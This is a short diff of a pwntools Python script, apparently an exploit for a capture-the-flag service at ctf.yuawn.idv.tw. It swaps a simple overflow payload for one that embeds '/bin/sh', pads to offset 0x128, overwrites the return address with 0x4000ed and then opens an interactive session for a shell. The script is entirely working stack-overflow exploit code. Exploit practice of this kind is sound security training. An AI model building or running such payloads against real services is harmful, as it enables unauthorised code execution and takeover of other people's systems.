@@ -5,15 +5,15 @@ from pwn import *
 
 context.arch = 'amd64'
 
-host , port = 'ctf.yuawn.idv.tw' , 10100
+host , port = 'ctf.yuawn.idv.tw' , 10108
 y = remote( host , port )
 
-p = flat(
-    'D' * 0x18,
-    0x40063a
-)
+p = '/bin/sh\x00'
+p += 'D' * ( 0x128 - len( p ) )
+p += p64( 0x4000ed )
+p += 'a' * ( 322 - len( p ) )
 
-y.sendline( p )
+#y.send( p )
 
 
 y.interactive()
